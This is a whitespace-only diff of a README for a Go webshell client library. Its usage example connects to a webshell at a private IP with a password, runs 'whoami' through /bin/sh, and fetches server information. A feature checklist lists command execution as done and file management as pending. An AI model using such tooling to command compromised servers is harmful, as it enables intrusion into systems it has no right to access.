@@ -16,20 +16,20 @@ webshell,err:=gowebshell.NewWebshell("http://172.16.95.24/test.php","cc123","",n
 		return
 	}
 //执行命令，必须要执行命令的目录，命令和使用的shell，windows只能使用cmd，和脚本类型
-	cmd,err:=webshell.ExecCommand("/usr","whoami","/bin/sh", gowebshell.PhpScriptCmd,nil)
+cmd,err:=webshell.ExecCommand("/usr","whoami","/bin/sh", gowebshell.PhpScriptCmd,nil)
 	if err!=nil{
 		fmt.Println(err)
 		return
 	}
 //命令结果存在cmd的result中
-	fmt.Println(cmd.Result)
+fmt.Println(cmd.Result)
 //获取基本信息，指定脚本类型
-  info,err:=webshell.GetBaseInfo(gowebshell.JspScriptBaseInfo,nil)
-    if err!=nil{
-      fmt.Println(err)
-			return
-    }
-    fmt.Println(info)
+info,err:=webshell.GetBaseInfo(gowebshell.JspScriptBaseInfo,nil)
+  if err!=nil{
+    fmt.Println(err)
+    return
+  }
+  fmt.Println(info)
 
 ```
 
@@ -52,3 +52,4 @@ www-data
 - [x] 获取基本信息
 - [x] 执行命令
 - [ ] 文件管理
+
